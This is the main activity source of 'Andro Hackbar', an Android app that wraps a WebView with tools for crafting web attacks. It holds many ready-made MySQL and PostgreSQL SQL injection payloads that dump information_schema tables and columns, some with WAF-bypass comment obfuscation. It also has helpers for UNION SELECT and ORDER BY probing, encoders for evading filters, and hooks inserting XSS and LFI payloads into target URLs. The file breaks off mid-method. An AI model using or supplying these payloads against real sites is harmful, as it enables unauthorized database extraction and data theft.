
package zyberph.hackbar.zk;

import android.app.*;
import android.os.*;
import android.view.*;
import android.widget.*;
import android.annotation.*;
import android.content.*;
import android.webkit.*;
import java.math.*;
import java.io.*;
import java.util.*;
import android.net.*;
import org.apache.http.*;
import java.net.CookieManager;
import java.net.CookieStore;
import android.view.ViewDebug.*;
import java.net.*;
import android.util.*;
import org.apache.http.client.*;
import org.apache.http.impl.client.*;
import org.apache.http.client.methods.*;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.io.*;
import java.net.*;
import android.graphics.*;
import org.apache.http.message.*;
import org.apache.http.client.entity.*;
import android.view.animation.*;
import org.apache.http.util.*;
import android.support.v4.*;
import org.jsoup.nodes.*;
import org.jsoup.*;
import org.jsoup.select.*;
import java.security.*;
import com.google.android.gms.ads.AdListener;
import com.google.android.gms.ads.AdRequest;
import com.google.android.gms.ads.AdView;
import com.google.android.gms.ads.InterstitialAd;



public class MainActivity extends Activity {
	private EditText field,field2,hexstring,find,b64en,postdata;
	private WebView browser;
	private ProgressBar p1;
	private Context context = this;
	LinearLayout ml, vertmainLinearLayout3;
	private Button execb,srcbtn;
	protected String devg,devn,appn;
	private Button bs,ub,waf,optb,gostopb,sqlconv;
	private TextView jstat,uastat;
	private InterstitialAd interstitialad;
	
	
	@Override		
	protected void onCreate(Bundle savedInstanceState){
		super.onCreate(savedInstanceState);

	    setContentView(R.layout.laymain);

		field = (EditText)findViewById(R.id.urlField);
		browser = (WebView)findViewById(R.id.webView1);
		field2 = (EditText)findViewById(R.id.qfield);
		bs = (Button)findViewById(R.id.bs);
		ub = (Button)findViewById(R.id.ub);
		find = (EditText)findViewById(R.id.findtxt);
		waf = (Button)findViewById(R.id.waf);
		optb = (Button)findViewById(R.id.optb);
		p1 = (ProgressBar)findViewById(R.id.p1);
		ml = (LinearLayout)findViewById(R.id.mli);
		hexstring = (EditText)findViewById(R.id.hexstrings);
		b64en = (EditText)findViewById(R.id.b64);
		execb = (Button)findViewById(R.id.execqf);
		gostopb = (Button)findViewById(R.id.gostopb);
		srcbtn = (Button)findViewById(R.id.srcbtn);
		postdata = (EditText)findViewById(R.id.postdata);
		sqlconv = (Button)findViewById(R.id.sqlchar);
		vertmainLinearLayout3 = (LinearLayout)findViewById(R.id.vertmainLinearLayout3);
		jstat = (TextView)findViewById(R.id.jstat);
		uastat = (TextView)findViewById(R.id.uastat);
		browser.getSettings().setBuiltInZoomControls(true);
		browser.getSettings().setJavaScriptEnabled(false);
		browser.loadData("<html><body bgcolor=\"black\"></body></html>","text/html",null);
        
				
		
		devg = getString(R.string.dev_group);
		devn = getString(R.string.dev);
		appn = getString(R.string.app_name);
		
		/* adView = (AdView) this.findViewById(R.id.adView);

	
		AdRequest adRequest = new AdRequest.Builder()

			Add a test device to show Test Ads
			.addTestDevice(AdRequest.DEVICE_ID_EMULATOR)
			.addTestDevice("")
			.build();

		// Load ads into Banner Ads
		adView.loadAd(adRequest);
		*/
		interstitialad = new InterstitialAd(MainActivity.this);
		// Insert the Ad Unit ID
		interstitialad.setAdUnitId("ca-app-pub-4595482992212885/3865177450");

		AdRequest adRequest = new AdRequest.Builder()
			.build();
		interstitialad.loadAd(adRequest);

		// Prepare an Interstitial Ad Listener
		interstitialad.setAdListener(new AdListener() {
				public void onAdLoaded() {
					// Call displayInterstitial() function
					displayInterstitial();
				}
			});
		
		Toast.makeText(context, "Visit our forum at https://zyberph.com",Toast.LENGTH_LONG).show();
		String devghx = byteArrayToHex(devg.getBytes());
		String devnhx = byteArrayToHex(devn.getBytes());
		String appnhx = byteArrayToHex(appn.getBytes());
		if (devghx.equals("5a59424552504820444556454c4f50455253")&& 
			devnhx.equals("5a616e646572204b756c616675")&& 
			appnhx.equals("416e64726f204861636b626172")){
	
		}else{setContentView(R.layout.chckmod);}
	}

	public void xit(View v){

		System.exit(1);
	}
	
	static String xtractedlink="";
	private static void print(String msg, Object... args){

		xtractedlink = xtractedlink+(String.format(msg, args));

	}
	
public void extractlink(View v){
		Toast.makeText(this,"Extracting links.",Toast.LENGTH_SHORT).show();
		
		new Thread(new Runnable() {
					@Override
					public void run(){
						try{

							
					Document doc = Jsoup.connect(browser.getUrl()).get();
					Elements links = doc.select("a[href]");
					Elements actions = doc.select("[action]");
					Elements imports = doc.select("link[href]");
			

			for (Element link : imports){
				print("%s<hr>", link.attr("abs:href"), link.attr("rel"));
			}
	
			for (Element link : links){
						print("%s<hr>", link.attr("abs:href"));
							}
						
			for (Element act : actions){
						print("%s<hr>", act.attr("abs:action"));
							}		
							}catch (Exception e){
								
							}
		
							browser.post(new Runnable() {
								@Override
								public void run(){
									
									browser.loadData("<html><body bgcolor=\"black\"><font color=#ffffff><b>Extracted Links</b><hr>"+xtractedlink+"</html>", "text/html", null);
									xtractedlink = "";
									}
							});
					}
				}).start();
	}
	String getdoc = "";
	public void get(View v){
		Toast.makeText(this,"Fetching source code.",Toast.LENGTH_SHORT).show();
		
		new Thread(new Runnable() {
					@Override
					public void run(){
						try{

							
					Document doc = Jsoup.connect(browser.getUrl()).userAgent(System.getProperty("http.agent")).get();
					getdoc = doc.toString();
							
							}catch (Exception e){
								
							}
		
							browser.post(new Runnable() {
								@Override
								public void run(){
									
									browser.loadData(getdoc, "text/plain", null);
								}
							});
					}
				}).start();
	}
	
	String checkval = "0";
	public void postcheck(View v){
		if (checkval.equals("0")){
			checkval = "1";
			postdata.setVisibility(View.VISIBLE);
		}else{
			checkval = "0";
			postdata.setVisibility(View.GONE);
		}
	}

	String jsoff = "0";
	public void jsoff(View v){
		if (jsoff.equals("0")){jsoff="1";
		browser.getSettings().setJavaScriptEnabled(true);
			}
		else{jsoff="0";
			browser.getSettings().setJavaScriptEnabled(false);}
			 
	}
	
	public void parse (View v){
		browser.setWebViewClient(new MyBrowser());
		browser.getSettings().setLoadsImagesAutomatically(true);
		browser.getSettings().setSupportZoom(true);
		browser.loadData(field2.getText().toString(), "text/html", null);
		
	}

	public void copyquery (View v){
		setClipboard(this, field2.getText().toString());
		Toast.makeText(this,"Copied to clipboard.",Toast.LENGTH_SHORT).show();
	}
	private void setClipboard(Context context,String text) {
		if(android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.HONEYCOMB) {
			android.text.ClipboardManager clipboard = (android.text.ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
			clipboard.setText(text);
		} else {
			android.content.ClipboardManager clipboard = (android.content.ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
			android.content.ClipData clip = android.content.ClipData.newPlainText("Copied Text", text);
			clipboard.setPrimaryClip(clip);
		}
	}
	
	public void execqf(View view){

			if (!haveNetworkConnection()){
			Toast.makeText(context, "Please check internet connection.",
						   Toast.LENGTH_LONG).show();

		}else{

			if (!field2.getText().toString().equals("")){
				if (!field2.getText().toString().startsWith("http://")
					&&!field2.getText().toString()
					.startsWith("https://")){
					field2.setText("http://"+field2.getText().toString());
				}
				gostopb.setVisibility(View.VISIBLE);

				p1.setVisibility(View.VISIBLE);
				if (checkval.equals("1")){
					Toast.makeText(this,"POSTING DATA: "+postdata.getText().toString(),Toast.LENGTH_SHORT).show();
					
					browser.setWebViewClient(new MyBrowser());
					browser.postUrl(field2.getText().toString(),EncodingUtils.getBytes(postdata.getText().toString(),"UTF-8"));
			
					}else{
					browser.setWebViewClient(new MyBrowser());
					String url2 = field2.getText().toString();
					browser.getSettings().setLoadsImagesAutomatically(true);
					browser.setScrollBarStyle(View.SCROLLBARS_INSIDE_OVERLAY);
					browser.loadUrl(url2);
				}

			}
		}
	}
   
	public void open(View view){

		if (!haveNetworkConnection()){
			Toast.makeText(context, "Please check internet connection.",
						   Toast.LENGTH_LONG).show();

		}else{ 

			if (!field.getText().toString().equals("")){
				if (!field.getText().toString().startsWith("http://")
					&&!field.getText().toString()
					.startsWith("https://")){
					field.setText("http://"+field.getText().toString());
				}
				browser.setWebViewClient(new MyBrowser());
				String url = field.getText().toString();
				browser.getSettings().setLoadsImagesAutomatically(true);
				browser.loadUrl(url);
				gostopb.setVisibility(View.VISIBLE);
				p1.setVisibility(View.VISIBLE);
				
			}
		}}

	public void goback(View v){
		if (browser.canGoBack()){
			browser.goBack();
			p1.setVisibility(View.VISIBLE);

		}
	}
	public void goforward(View v){
		if (browser.canGoForward()){

			browser.goForward();
			p1.setVisibility(View.VISIBLE);

		}
	}
	public void gostop(View v){

		browser.stopLoading();


	}
	

	public void loadurl(View v){
		LayoutInflater li = LayoutInflater.from(context);
						View prompt = li.inflate(R.layout.load_url, null);

						AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(
							context);
						alertDialogBuilder.setView(prompt);

						final TextView Input = (TextView) prompt
							.findViewById(R.id.lurl);
							
							Input.setText(browser.getUrl());
						alertDialogBuilder
							.setCancelable(true)
							 .setPositiveButton("HACKBAR",
							new DialogInterface.OnClickListener() {
								public void onClick(DialogInterface dialog,
													int id){

					
									String enurl =	field.getText().toString();

									try{
										String newurl =	URLDecoder.decode
										(enurl, "UTF-8");

										field2.setText(newurl);}catch (Exception e){}

									
														
														}
							})
							.setNegativeButton("BROWSER",
							new DialogInterface.OnClickListener() {
								public void onClick(DialogInterface dialog,
													int id){

									Intent i = new Intent(Intent.ACTION_VIEW,Uri.parse(field.getText().toString()));
		    	startActivity(i);
														
														
														}
							});
							
							
						AlertDialog alertDialog = alertDialogBuilder.create();
						alertDialog.show();
		
	}
	 

	
	

	
	
	private class MyBrowser extends WebViewClient{
		
		@Override
		public boolean shouldOverrideUrlLoading(WebView view, String url){
			browser.getSettings().setUserAgentString(System.getProperty("http.agent",""));
			
			p1.setVisibility(View.VISIBLE);
			view.loadUrl(url);
			field.setText(url);
			return true;
		}

		@Override
		public void onPageFinished(WebView view, String url){
			super.onPageFinished(view, url);
			String ul = view.getUrl();
			field.setText(ul);
			gostopb.setVisibility(View.GONE);
			p1.setVisibility(View.GONE);
			execb.setEnabled(true);

			/*
			CookieSyncManager syncManager = CookieSyncManager.createInstance(MainActivity.this );
            syncManager.sync();
CookieManager manager = new CookieManager();
            manager.setCookiePolicy(CookiePolicy.ACCEPT_ALL);
CookieHandler.setDefault(manager);
try {
     URL blah = new URL(url);
HttpURLConnection con =
( HttpURLConnection) blah.openConnection();
	InputStream is
		= con.getInputStream();
	InputStreamReader isr = new InputStreamReader
	(is);
	int
		numCharsRead;
	char []
		charArray = new char [1024];
	StringBuffer sb
		= new StringBuffer();
	while
	((numCharsRead=isr.read(charArray))>0){
		sb.append(charArray, 0,
				  numCharsRead);
	}
	 String response =
		sb.toString();
		
		}
catch (Exception e) {}
CookieStore cookieJar =
manager.getCookieStore();
List< HttpCookie> cookies =
cookieJar.getCookies();
for ( HttpCookie cookie: cookies) {
field2.setText(field2.getText().toString()+"\n"+"\nCookie name :" +cookie.getName().toString());
            }*/
        }
		

	}


	public void displayInterstitial() {
		// If Ads are loaded, show Interstitial else show nothing.
		if (interstitialad.isLoaded()) {
			interstitialad.show();
		}
	}
	
	public void showhide(View v){
		
		if (ml.getVisibility()==0){
		/*	ads = (ads+1);
			if (ads == 5){
				displayInterstitial();
				if (ads == 10){ads = 0;}
			}*/
			ml.setVisibility(View.INVISIBLE);
		//	adView.setVisibility(View.INVISIBLE);
			jstat.setVisibility(View.VISIBLE);
			uastat.setVisibility(View.VISIBLE);
			uastat.setText("User-Agent:\n"+System.getProperty("http.agent",""));
			if (jsoff.equals("0")){jstat.setText("Javascript: Off");}
			else {jstat.setText("Javascript: On");}
		}else{
			ml.setVisibility(View.VISIBLE);
			jstat.setVisibility(View.GONE);
	    	uastat.setVisibility(View.GONE);
		//	adView.setVisibility(View.VISIBLE);
			
		}
	}


	//clear query
	public void clr(View v)
	{
		field2.setText("");
		}

//Find on page

	public void findon(View v){
	//	browser.getSettings().setJavaScriptEnabled(true);
		String txt = find.getText().toString();
	if (jsoff.equals("0")){
		Toast.makeText(this,"Please turn on javascript.",Toast.LENGTH_SHORT).show();
	}else{
		browser.loadUrl("javascript:var text='"+txt+"';if (window.find) {document.designMode ='on';var sel = window.getSelection();sel.collapse(document.body, 0);while (window.find(text)) { document.execCommand('HiliteColor', false, 'gray');sel.collapseToEnd();}document.designMode = 'off';} else if (document.body.createTextRange) { var textRange = document.body.createTextRange(); while (textRange.findText(text)) {textRange.execCommand('BackColor', false, 'gray'); textRange.collapse(false);}}");
		browser.loadUrl("javascript:var offset =$('"+"#id_of_highlighted_element'"+").o().top;window.scrollTo(0,offset);");
		find.setText("");
		}


	}

	static String strtouse= "";

static String hashType = "";
public static final String hash(final String toEncrypt) {
try {
final MessageDigest digest =
MessageDigest.getInstance(hashType);
        digest.update(toEncrypt.getBytes());
final byte[] bytes = digest.digest();
final StringBuilder sb = new StringBuilder();
for (int i = 0; i < bytes.length; i++) {
            sb.append(String.format("%02X",bytes[i]));
        }
return sb.toString().toLowerCase();
    } catch ( Exception exc) {
return ""; 
    }
}


String enc_c = "";

String selectedText = "";
	public void sqlcharconvert(View v){
		
		PopupMenu pop2 = new PopupMenu(MainActivity.this, sqlconv);
		pop2.getMenuInflater().inflate(R.menu.encodevia, pop2.getMenu());

		pop2.setOnMenuItemClickListener(new PopupMenu.OnMenuItemClickListener(){
				public boolean onMenuItemClick(MenuItem item){
					
					if (item.getTitle().equals("Via Input")){
						LayoutInflater li = LayoutInflater.from(context);
						View prompt = li.inflate(R.layout.encvia, null);

						AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(
							context);
						alertDialogBuilder.setView(prompt);

						final EditText Input = (EditText) prompt
							.findViewById(R.id.editText1);
						alertDialogBuilder
							.setCancelable(false)
							.setPositiveButton("OK",
							new DialogInterface.OnClickListener() {
								public void onClick(DialogInterface dialog,
													int id){

									selectedText = Input.getText().toString();
									enc_();
									
								}


							});
						AlertDialog alertDialog = alertDialogBuilder.create();
						alertDialog.show();

					} else {

						int startSelection=field2.getSelectionStart();
						int endSelection=field2.getSelectionEnd();
						String htext = field2.getText
						().toString().substring(startSelection, endSelection);
						selectedText = htext;
						
						enc_();
						
					}
		
					return true;
				}
			});
		pop2.show();
		
		
	}
	private void enc_(){
		
		PopupMenu pop = new PopupMenu(MainActivity.this, sqlconv);
		pop.getMenuInflater().inflate(R.menu.sqlchar, pop.getMenu());

		
		pop.setOnMenuItemClickListener(new PopupMenu.OnMenuItemClickListener(){
				public boolean onMenuItemClick(MenuItem item){
					
			
					
			
					if (item.getTitle().equals("SQL: MYSQL")){
						if (selectedText.length() <= 0){
							
						}
					else{
					int c;
					int dec;
					String dectxt = "";
					for (c = 0; c < selectedText.length(); c++){
						dec = selectedText.charAt(c);
						dectxt = dectxt+dec+", ";
					}
						String getf = field2.getText().toString();
						String newg = getf.replace(selectedText,"CHAR("+dectxt+")");
						String newf = newg.replace(", )",")");
						field2.setText(newf);
						}
						}
					
					if (item.getTitle().equals("SQL: MSSQL")){
					
						if (selectedText.length() <= 0){}else{
						
						
					int c;
					int dec;
					String dectxt = "";
					for (c = 0; c < selectedText.length(); c++){
						dec = selectedText.charAt(c);
						dectxt = dectxt+"CHAR("+dec+") + ";
					}
						String getf = field2.getText().toString();
						String newg = getf.replace(selectedText,dectxt+")");
						String newf = newg.replace(" + )","");
						field2.setText(newf);
					
						}
					}
					if (item.getTitle().equals("SQL: ORACLE")){
					if (selectedText.length() <= 0){}else{
						
							
						int c;
						int dec;
						String dectxt = "";
						for (c = 0; c < selectedText.length(); c++){
							dec = selectedText.charAt(c);
							dectxt = dectxt+"CHR("+dec+") || ";
						}
						String getf = field2.getText().toString();
						String newg = getf.replace(selectedText,dectxt+")");
						String newf = newg.replace(" || )","");
						field2.setText(newf);

						}
						
						}
					
					
						
						if (item.getTitle().equals("STR.FROMCHARCODE")){
	
						if (selectedText.length() <= 0){}
					
						else{
						int c;
						int dec;
						String dectxt = "";
						for (c = 0; c < selectedText.length(); c++){
							dec = selectedText.charAt(c);
							dectxt = dectxt+dec+", ";
						}
						String getf = field2.getText().toString();
						String newg = getf.replace(selectedText,"String.fromCharCode("+dectxt+")");
						String newf = newg.replace(", )",")");
						field2.setText(newf);
						}
						}
					if (item.getTitle().equals("STR.HTML")){

						if (selectedText.length() <= 0){}
						else{
						int c;
						int dec;
						String dectxt = "";
						for (c = 0; c < selectedText.length(); c++){
							dec = selectedText.charAt(c);
							dectxt = dectxt+"&#"+dec+";";
						}
						String getf = field2.getText().toString();
						String newg = getf.replace(selectedText,dectxt);
						
						field2.setText(newg);

						}
					}
					if (item.getTitle().equals("MD5")){
					hashType = "md5";
						if (selectedText.length() <= 0){}
						else{
							
					String en = field2.getText().toString();
					String newen = en.replace(selectedText.toString(), hash(selectedText.toString()));
					field2.setText(newen);
					hashType="";
					}
					}
					
					if (item.getTitle().equals("SHA-1")){
					hashType = "sha-1";
						if (selectedText.length() <= 0){}
						else{
							
					String en = field2.getText().toString();
					String newen = en.replace(selectedText.toString(), hash(selectedText.toString()));
					field2.setText(newen);
					hashType="";
					}
					}
					if (item.getTitle().equals("HEX")){
					
						if (selectedText.length() <= 0){}else{
							String nenc = "0x"+byteArrayToHex(selectedText.getBytes());
							String newsel = field2.getText().toString().replace(selectedText, nenc);
							field2.setText(newsel);
							}
					}if (item.getTitle().equals("UNHEX")){
						try{

							String newhstring = selectedText.replace("0x", "");
							String i = unHex(newhstring);
							String newi = field2.getText().toString().replace(selectedText, i);
							field2.setText(newi);


						}catch (Exception e){
							Toast.makeText(context,"Error:"+e.getMessage(),Toast.LENGTH_SHORT).show();
						}
						
					}if (item.getTitle().equals("URLENCODE")){
						String nenc = "EN"+byteArrayToHex(selectedText.getBytes());
						String percent = nenc.replaceAll("(.{2})(?!$)", "$1%");
						String newpercent = percent.replace("EN","");
						String newsel = field2.getText().toString().replace(selectedText, newpercent);
						field2.setText(newsel);
						
					}if (item.getTitle().equals("URLDECODE")){
						try{
							String dec = URLDecoder.decode(selectedText, "UTF-8");

							String newdec = field2.getText().toString().replace(selectedText, dec);
							field2.setText(newdec);
						}catch (Exception e){}
						
					}if (item.getTitle().equals("BASE64 ENC")){
						
						String newb64 =	Base64.encodeToString(selectedText.getBytes(), Base64.DEFAULT);
						String newsel = field2.getText().toString().replace(selectedText,newb64);
						field2.setText(newsel);
						

					}
					if (item.getTitle().equals("BASE64 DEC")){
						try {
						String newsel = field2.getText().toString();
						
					String nsel = newsel.replace(selectedText,Base64.decode(selectedText.getBytes(),Base64.DEFAULT)+"");
						field2.setText(nsel);

						}catch (Exception e){
							
						}

					}
					return true;
				}
			});
		pop.show();
	}
	//Hex string
	public static String
	byteArrayToHex(byte[] a){
		StringBuilder sb =
			new StringBuilder
		(a.length*2);
		for (byte b: a)
			sb.append
			(String.format("%02x",
						   b&0xff));  
		return sb.toString();
	}

	
	
public static String unHex(String arg) {        

    String str = "";
    for(int i=0;i<arg.length();i+=2)
    {
        String s = arg.substring(i, (i + 2));
        int decimal = Integer.parseInt(s, 16);
        str = str + (char) decimal;
    }       
    return str;
}


	


	//check if have internet
	private boolean haveNetworkConnection(){
		boolean haveConnectedWifi = false;
		boolean haveConnectedMobile = false;

		ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo[] netInfo = cm.getAllNetworkInfo();
		for (NetworkInfo ni : netInfo){
			if (ni.getTypeName().equalsIgnoreCase("WIFI"))
				if (ni.isConnected())
					haveConnectedWifi = true;
			if (ni.getTypeName().equalsIgnoreCase("MOBILE"))
				if (ni.isConnected())
					haveConnectedMobile = true;
		}
		return haveConnectedWifi||haveConnectedMobile;
	}

	//Union base
	String madblood = "export_set(5,@:=0,(select+count(*)/*!50000from*/+/*!50000information_schema*/.columns+where@:=export_set(5,export_set(5,@,0x3c6c693e,/*!50000column_name*/,2),0x3a3a,/*!50000table_name*/,2)),@,2)";
	String trojan ="concat/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a207e7472306a416e2a2044756d7020496e204f6e652053686f74205175657279203c666f6e7420636f6c6f723d626c75653e28574146204279706173736564203a2d20207620312e30293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e))),0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version(),0x7e20,@@version_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=database(),0x3c62723e44617461626173652055736572203a3a20,user(),(/*!12345selEcT*/(@x)/*!from*/(/*!12345selEcT*/(@x:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(/*!12345selEcT*/(0) from(information_schema./**/columns)where(table_schema=database()) and(0x00)in(@x:=Concat/*!(@x, 0x3c62723e, if( (@tbl!=table_name), Concat/*!(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1, 2, 0x30),0x2e203c2f666f6e743e,@tbl:=table_name,0x203c666f6e7420636f6c6f723d677265656e3e3a3a204461746162617365203a3a203c666f6e7420636f6c6f723d626c61636b3e28,database(),0x293c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e), 0x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running_number%2b1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e))))x)))))*/";
	String roothex = "(select+concat(0x3c666f6e7420666163653d43616d627269612073697a653d323e72306f74404833583439203a3a20,version(),0x3c666f6e7420636f6c6f723d7265643e3c62723e,0x446174616261736573203a7e205b,(Select+count(Schema_name)from(information_Schema.schemata)),0x5d3c62723e5461626c6573203a7e205b,(Select+count(table_name)from(information_schema.tables)),0x5d3c62723e436f6c756d6e73203a7e205b,(Select+count(column_name)from(information_Schema.columns)),0x5d3c62723e,@)from(select(@:=0x00),(@db:=0),(@db_nr:=0),(@tbl:=0),(@tbl_nr:=0),(@col_nr:=0),(select(@)from(information_Schema.columns)where(@)in(@:=concat(@,if((@db!=table_schema),concat((@tbl_nr:=0x00),0x3c666f6e7420636f6c6f723d7265643e,LPAD(@db_nr:=@db_nr%2b1,2,0x20),0x2e20,@db:=table_schema,0x2020202020203c666f6e7420636f6c6f723d707572706c653e207b205461626c6573203a7e205b,(Select+count(table_name)from(information_schema.tables)where(table_schema=@db)),0x5d7d203c2f666f6e743e3c2f666f6e743e),0x00),if((@tbl!=table_name),concat((@col_nr:=0x00),0x3c646976207374796c653d70616464696e672d6c6566743a343070783b3e3c666f6e7420636f6c6f723d626c75653e202020,LPAD(@tbl_nr:=@tbl_nr%2b1,3,0x0b), 0x2e20,@tbl:=table_name,0x20202020203c666f6e7420636f6c6f723d707572706c653e2020207b2020436f6c756d6e73203a7e20205b,(Select+count(column_name)from(information_Schema.columns)where(table_name=@tbl)),0x5d202f203c666f6e7420636f6c6f723d626c61636b3e205265636f726473203a7e205b,(Select+if null(table_rows,0x30)+from+information_schema.tables+where+table_name=@tbl),0x5d207d3c2f666f6e743e3c2f666f6e743e3c2f666f6e743e3c2f6469763e),0x00),concat(0x3c646976207374796c653d70616464696e672d6c6566743a383070783b3e3c666f6e7420636f6c6f723d677265656e3e,LPAD(@col_nr:=@col_nr%2b1,3,0x0b),0x2e20,column_name,0x3c2f666f6e743e3c2f6469763e)))))x)";
	String madbloodroot = "+and@x:=concat+(@:=0,(select+count(*)/*!50000from*/information_schema.columns+where+table_schema=database()+and@:=concat+(@,0x3c6c693e,table_name,0x3a3a,column_name)),@)/*!50000UNION*/SELECT+";
	String drzero="(select(select+concat(@:=0xa7,(select+count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@)))";
	String makman2 = "(select(@x)from(select(@x:=0x00),(@nr:=0),(@tbl:=0x0),(select(0)from(information_schema.tables)where(table_schema=database())and(0x00)in(@x:=concat_ws(0x20,@x,lpad(@nr:=@nr%2b1,3,0x0b),0x2e20,0x3c666f6e7420636f6c6f723d7265643e,@tbl:=table_name,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d677265656e3e203a3a3a3a3c2f666f6e743e3c666f6e7420636f6c6f723d626c75653e20207b2020436f6c756d6e73203a3a205b3c666f6e7420636f6c6f723d7265643e,(select+count(*)+from+information_schema.columns+where+table_name=@tbl),0x3c2f666f6e743e5d20207d3c2f666f6e743e,0x3c62723e))))x)";
	String zenwaf = "(/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(`InFoRMAtiON_sCHeMa`.`ColUMNs`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c62723e5461626c6520466f756e64203a20,TaBLe_nAMe,0x3a3a,column_name))))a)";
	String waff = "(/*!50000select*/+concat+(@:=0,(/*!50000select*/+count(*) from+/*!50000information_schema.tables*/+WHERE(TABLE_SCHEMA!=0x696e666f726d6174696f6e5f736368656d61)AND@:=concat+(@,0x3c62723e,/*!50000table_name*/)),@))";
	String darkjin ="concat(@c:=0x00,if((select count(*) from information_schema.columns where table_schema not like 0x696e666f726d6174696f6e5f736368656d61 and @c:=concat(@c,0x3c62723e,table_name,0x2e,column_name)),0x00,0x00),@c)";
	String darkjinwaf ="concat%0b(@c:=0x00,if((select count(*) from /*!50000information_schema*/.columns /*!50000where*/ table_schema not like 0x696e666f726d6174696f6e5f736368656d61 and @c:=concat%0b(@c,0x3c62723e,/*!50000table_name*/,0x2e,/*!50000column_name*/)),0x00,0x00),@c)";
	String basic1 = "(select (@x) from (select (@x:=0x00),(select (0) from (information_schema.schemata) where (0x00) in (@x:=concat(@x,0x3c62723e,schema_name))))x)";
	String basic2 ="(select (@x) from (select (@x:=0x00),(select (0) from (information_schema.tables) where (table_schema=database()) and (0x00) in (@x:=concat(@x,0x3c62723e,table_name))))x)";
	
	//XSS VECTOR
	String [] xss_payload = XSS.payload;
	
	// Local File Inclusion
	String [] lfi_payload = LFI.payload;
			
	private void lfi_set(String s){
		field2.setText(field2.getText().toString()+lfi_payload[(Integer.parseInt(s)-1)]);
	}
	private void xss_set(String s){
		field2.setText(field2.getText().toString()+xss_payload[(Integer.parseInt(s)-1)]);
	}
	public void ub(View v){
		PopupMenu pop = new PopupMenu(MainActivity.this, ub);
		pop.getMenuInflater().inflate(R.menu.sqlb, pop.getMenu());

		pop.setOnMenuItemClickListener(new PopupMenu.OnMenuItemClickListener(){
				public boolean onMenuItemClick(MenuItem item){
					if (item.getTitle().equals("SQL: Order By")){

						field2.setText(field2.getText().toString()+"+ORDER+BY 10");
					}
					//uselect
					if (item.getTitle().equals("SQL: Union Select")){


						field2.setText(field2.getText().toString()+"+UNION+SELECT ");
						LayoutInflater li = LayoutInflater.from(context);
						View prompt = li.inflate(R.layout.uselect, null);

						AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(
							context);
						alertDialogBuilder.setView(prompt);

						final EditText Input = (EditText) prompt
							.findViewById(R.id.editText1);
						alertDialogBuilder
							.setCancelable(false)
							.setPositiveButton("OK",
							new DialogInterface.OnClickListener() {
								public void onClick(DialogInterface dialog,
													int id){

									if (Input.length()<1){

									}else{
										String ii = Input.getText().toString();

										int l=Integer.parseInt(ii);

										for (int i=1; i<=l; i++){
											if (i==l){

												field2.setText(field2.getText().toString()+i);

											}else{

												field2.setText(field2.getText().toString()+i+",");
											}
										}
									}
								}
							})
							.setNegativeButton("Cancel",
							new DialogInterface.OnClickListener() {
								public void onClick(DialogInterface dialog,
													int id){


									String i = field2.getText().toString().replace(" UnIoN+sElEcT ", "");

									field2.setText(i);
									dialog.cancel();
								}
							});
						AlertDialog alertDialog = alertDialogBuilder.create();
						alertDialog.show();


					}	

					
				if (item.getTitle().equals("LFI: Payloads")){
				PopupMenu pop = new PopupMenu(MainActivity.this, ub);
				pop.getMenuInflater().inflate(R.menu.lfi, pop.getMenu());

				pop.setOnMenuItemClickListener(new PopupMenu.OnMenuItemClickListener(){
						public boolean onMenuItemClick(MenuItem item){

							
							lfi_set(item.getTitle().toString().replace("Payload ",""));
						
							return true;
				}
			});
		pop.show();
							
				
			}
					
					if (item.getTitle().equals("XSS: Payloads")){
						PopupMenu pop = new PopupMenu(MainActivity.this, ub);
						pop.getMenuInflater().inflate(R.menu.xss, pop.getMenu());

						pop.setOnMenuItemClickListener(new PopupMenu.OnMenuItemClickListener(){
								public boolean onMenuItemClick(MenuItem item){

									
									xss_set(item.getTitle().toString().replace("Payload ",""));
									
															return true;
								}
							});
						pop.show();


					}
					if (item.getTitle().equals("SQL: Postgre")){
						PopupMenu pop = new PopupMenu(MainActivity.this, ub);
						pop.getMenuInflater().inflate(R.menu.postgre, pop.getMenu());

						pop.setOnMenuItemClickListener(new PopupMenu.OnMenuItemClickListener(){
								public boolean onMenuItemClick(MenuItem item){

								
									//Postgre SQL
									String ps1 = "(select+array_to_string(array_agg(concat(table_name,'::',column_name)::text),$$%3Cli%3E$$)from+information_schema.columns+where+table_schema+not+in($$information_schema$$,$$pg_catalog$$))";
									String ps2 = "(select+string_agg(concat(table_name,'::',column_name),$$%3Cli%3E$$)from+information_schema.columns+where+table_schema+not+in($$information_schema$$,$$pg_catalog$$))";
									String ps3 = "(select+array_to_string(array(select+table_name||':::'||column_name::text+from+information_schema.columns+where+table_schema+not+in($$information_schema$$,$$pg_catalog$$)),'%3Cli%3E'))";

									
									String f2 = field2.getText().toString();

									if (item.getTitle().equals("QUERY 1")){
										field2.setText(f2+ps1);
									}
